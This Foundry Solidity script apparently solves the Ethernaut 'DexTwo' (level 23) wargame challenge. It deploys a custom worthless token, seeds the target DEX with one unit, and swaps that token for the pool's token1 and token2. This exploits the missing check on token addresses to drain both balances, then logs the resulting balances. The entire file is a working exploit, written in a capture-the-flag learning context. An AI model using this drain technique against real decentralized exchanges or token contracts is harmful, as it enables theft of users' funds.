// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {DexTwo} from "../src/level23/DexTwo.sol";
import {AttackDexTwo} from "../src/level23/AttackDexTwo.sol";

import "forge-std/console.sol";

contract level23Exploit is Script {
    DexTwo dexTwo = DexTwo(0x125BBFe6045e34e1136B62eD2335fC2c48f0fDB2);
    AttackDexTwo attackDexTwo;

    function run() external {
        vm.startBroadcast();

        address user = 0xa659D686d7D696D496BeB0b781AB4734A4673294;
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();
        attackDexTwo = new AttackDexTwo();
        dexTwo.approve(address(dexTwo), type(uint).max);

        attackDexTwo.transfer(address(dexTwo), 1);

        attackDexTwo.approve(address(dexTwo), 1);
        dexTwo.swap(address(attackDexTwo), token1, 1);

        attackDexTwo.approve(address(dexTwo), 2);
        dexTwo.swap(address(attackDexTwo), token2, 2);
        console.log("Token1: ", dexTwo.balanceOf(token1, user));
        console.log("Token2: ", dexTwo.balanceOf(token2, user));
        console.log("Dex Token1: ", dexTwo.balanceOf(token1, address(dexTwo)));
        console.log("Dex Token2: ", dexTwo.balanceOf(token2, address(dexTwo)));
        vm.stopBroadcast();
    }
}
